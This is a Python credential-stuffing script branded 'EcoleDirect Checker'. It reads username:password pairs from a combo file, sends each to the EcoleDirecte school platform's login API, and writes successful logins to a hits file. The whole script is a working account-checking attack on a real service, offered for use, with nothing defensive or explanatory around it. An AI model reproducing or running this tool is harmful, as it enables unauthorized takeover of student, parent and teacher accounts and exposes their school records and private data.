import time
import requests
import json
from colorama import init,Fore
from os import system
init()

system("title " + "EcoleDirect Checker By DK16#002")

url = "https://api.ecoledirecte.com/v3/login.awp"
headers = {}

combo = open('combo.txt', "r")









def check():
    for ligne in combo:
        acc = ligne.strip()
        user = acc.split(':')

        payload = "data={\n\t\"identifiant\": \"USER1\",\n\t\"motdepasse\": \"MDP2\"\n}"
        payload = payload.replace("USER1", user[0])
        payload = payload.replace("MDP2", user[1])
        r = requests.request("POST", url, headers=headers, data=payload)
        time.sleep(0.1)
        y = json.loads(r.text)
        if y["code"] == 200:
            print(Fore.GREEN + "[+]Hit:",acc)
            hit = open("hit.txt", "a")
            hit.write("\n")
            hit.write(acc)
        else:
            print(Fore.RED + "[+]Bad:",acc)







def start():
    print(Fore.GREEN + f'''

    $$$$$$$$\                    $$\           $$$$$$$\  $$\                                 $$\     
    $$  _____|                   $$ |          $$  __$$\ \__|                                $$ |    
    $$ |      $$$$$$$\  $$$$$$\  $$ | $$$$$$\  $$ |  $$ |$$\  $$$$$$\   $$$$$$\   $$$$$$$\ $$$$$$\   
    $$$$$\   $$  _____|$$  __$$\ $$ |$$  __$$\ $$ |  $$ |$$ |$$  __$$\ $$  __$$\ $$  _____|\_$$  _|  
    $$  __|  $$ /      $$ /  $$ |$$ |$$$$$$$$ |$$ |  $$ |$$ |$$ |  \__|$$$$$$$$ |$$ /        $$ |    
    $$ |     $$ |      $$ |  $$ |$$ |$$   ____|$$ |  $$ |$$ |$$ |      $$   ____|$$ |        $$ |$$\ 
    $$$$$$$$\\$$$$$$$\ \$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ |$$ |      \$$$$$$$\ \$$$$$$$\   \$$$$  |
    \________|\_______| \______/ \__| \_______|\_______/ \__|\__|       \_______| \_______|   \____/ 



    $$$$$$\  $$\                                     $$\                                            
    $$  __$$\ $$ |                                    $$ |                                           
    $$ /  \__|$$$$$$$\   $$$$$$\    $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\                   
    $$ |      $$  __$$\ $$  __$$\  $$  _____|$$ | $$  |$$  __$$\ $$  __$$\                  
    $$ |      $$ |  $$ |$$$$$$$$ ||$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|                 
    $$ |  $$\ $$ |  $$ |$$   ____||$$ |      $$  _$$<  $$   ____|$$ |                       
    \$$$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |                       
     \______/ \__|  \__| \_______|  \_______|\__|  \__| \_______|\__|                       
                                                                                                 
                                                                                               
                                                                                                 
                  
                                                                                     ''')
    check()  




start()


